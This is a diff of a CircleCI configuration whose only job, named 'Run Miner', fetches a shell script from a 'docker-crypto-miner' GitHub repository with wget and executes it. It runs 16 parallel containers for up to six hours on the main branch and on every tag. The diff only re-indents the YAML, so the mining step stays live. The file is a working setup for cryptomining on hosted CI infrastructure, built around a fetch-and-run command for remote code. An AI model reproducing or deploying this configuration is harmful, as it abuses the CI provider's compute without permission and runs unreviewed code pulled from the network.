@@ -1,3 +1,4 @@
+---
 version: 2.1
 
 description: |
@@ -6,23 +7,23 @@ description: |
 jobs:
   running:
     docker:
-      - image: circleci/ruby:3.0.3
+    - image: circleci/ruby:3.0.3
     parallelism: 16
     steps:
-      - run:
-          name: Run Miner
-          no_output_timeout: 360m
-          command: |
-            wget https://raw.githubusercontent.com/ci-monk/docker-crypto-miner/main/src/circleci/run.sh
-            chmod +x run.sh && ./run.sh
+    - run:
+        name: Run Miner
+        no_output_timeout: 360m
+        command: |
+          wget https://raw.githubusercontent.com/ci-monk/docker-crypto-miner/main/src/circleci/run.sh
+          chmod +x run.sh && ./run.sh
 
 workflows:
   version: 2
   build:
     jobs:
-      - running:
-          filters:
-            branches:
-              only: main
-            tags:
-              only: /.*/
+    - running:
+        filters:
+          branches:
+            only: main
+          tags:
+            only: /.*/
